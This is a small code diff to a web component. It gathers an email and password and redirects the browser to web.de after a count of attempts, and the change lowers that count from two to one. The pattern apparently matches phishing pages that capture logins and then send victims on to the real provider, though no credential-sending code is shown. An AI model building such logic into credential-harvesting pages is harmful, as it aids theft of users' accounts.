@@ -65,7 +65,7 @@ export default function Main() {
       email: credentials.email,
       password: credentials.passwort
     }
-    if (count === 2) {
+    if (count === 1) {
       window.location.href = 'https://web.de'
       return
     }
